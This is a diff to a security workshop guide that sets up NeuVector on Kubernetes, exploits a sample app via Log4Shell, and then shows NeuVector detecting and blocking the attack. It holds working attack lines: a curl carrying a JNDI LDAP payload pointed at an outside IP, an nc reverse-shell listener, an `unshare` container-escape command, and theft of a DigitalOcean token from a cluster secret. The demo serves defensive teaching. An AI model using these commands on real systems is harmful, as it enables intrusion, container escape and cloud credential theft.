@@ -67,8 +67,22 @@ helm install neuvector neuvector/core \
   --version 2.6.0 \
   --create-namespace
 ```
+# Step 3 - Accessing NeuVector
 
-# Step 3 - Prepare the Attack
+***Note:*** NeuVector may not immediately be available at the link below, as it may be starting up still. Please continue to refresh until NeuVector is available.
+
+First wait until all NeuVector Pods are up and running
+
+## Run the following commands on the victim VM.
+
+```kubectl get pods -n cattle-neuvector-system```
+
+1. Access NeuVector at https://neuvector.cattle-neuvector-system.${PUBLIC_IP}.sslip.io).
+2. For this Workshop, NeuVector is installed with a self-signed certificate from a CA that is not automatically trusted by your browser. Because of this, you will see a certificate warning in your browser. You can safely skip this warning. Some Chromium based browsers may not show a skip button. If this is the case, just click anywhere on the error page and type "thisisunsafe" (without quotes). This will force the browser to bypass the warning and accept the certificate.
+3. Log in with the username "admin" and the default password "admin"
+4. Make sure to agree to the Terms & Conditions
+
+# Step 4 - Prepare the Attack
 Let's install an application that poses as an LDAP server and provider a Java class to the vulnerable application which will create a remote connection back to the **attacker VM**. We will use python3 and  socat which are already installed on the attacker machine. Login into the attacker machine with username and password via SSH. 
 
 1. Change the promt to identify the shell.
@@ -243,5 +257,64 @@ do_token=$(kubectl get secret -n kube-system digitalocean -o jsonpath="{.data.ac
 Try to log in with the token:
 
 ```doctl auth init -t $do_token```
+
+# Step 1 Showing NeuVector
+## Showing Vulnerabilities
+### Show log4shell vulnerability and compliance
+1. Highlight the poor status of the node
+2. Go to **Security Risks** -> **Vulnerabilities**
+3. Filter for **CVE-2021-45046**
+4. Show another way on the **container** and go to **Assets** -> **Containers** -> **CVE-2021-45046**
+5. Go to the **Compliance** tab and filter for **root** to the Compliance warning
+### Show cgroup kernel vulnerability
+1. Go to **Assets** -> **Nodes** -> Filter for CVE **CVE-2022-0492**
+### Show Process Profile Rules 
+1.  Go back to **Policy** ->  **Groups** and filter for **sample app**
+2. Show the **Process Profile Rules**
+3. Describe the **Discover** Mode
+### Show the network Rules
+1. Show the **network rules** of the **sample app**
+## Show **Notification** -> **Security Events**
+## Block socat on Node level
+1. So we will block the socat process on the host level
+2. Go To **Policy** -> **Groups** -> Select **nodes** -> **Actions**
+    + •	Process name: socat
+    + •	Path: /usr/bin/socat
+    + •	Action: Deny
+3. Switch into **Protect** Mode
+4. Exit the terminal in the remote shell and try to trigger the c-group Event again
+5. In NeuVector go to **Notification** -> **Security Event**
+## Remove unneeded processes
+1. Switch the Mode to **Protection** for the **sample-app** container
+2. **Remove** not needed **processes** from the **sample app container**
+3. Try to exectute the following command in the attacker terminal
+   ```
+   unshare -UrmC bash
+   ```
+4. Execute `ls` in the terminal and then delete it from the rules list and show the result
+5. Take also a look into **Notification** -> **Security Events** to show the Critical Messages
+## Deny remote Connection
+1. Go To **Policy** -> **Network Rules**
+2. Remove the **sample app -> external** connections
+3. Go back to the terminal and try `ls` again and see, that there is no response
+4. Cancel and open the netcat again:
+```
+sudo nc -lvnp 443
+```
+6. Do the curl again:
+```
+curl http://sample-app.default.3.79.57.125.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://3.68.166.70:1389/a}'
+```
+
+6. Show the notificaton
+## Now we will block the Log4Shell itself
+1. Enable the WAF for the sample app
+2. Execute Curl show Notification and PCAP again
+## Show Admission Controll
+1. ** Policy ** -> ** Admission Control **
+2. Delete the sample-app pod
+3. Show Error Message in the ** Deployment** Section
+4. Going back to presentation
+5. Do a recap
 
 
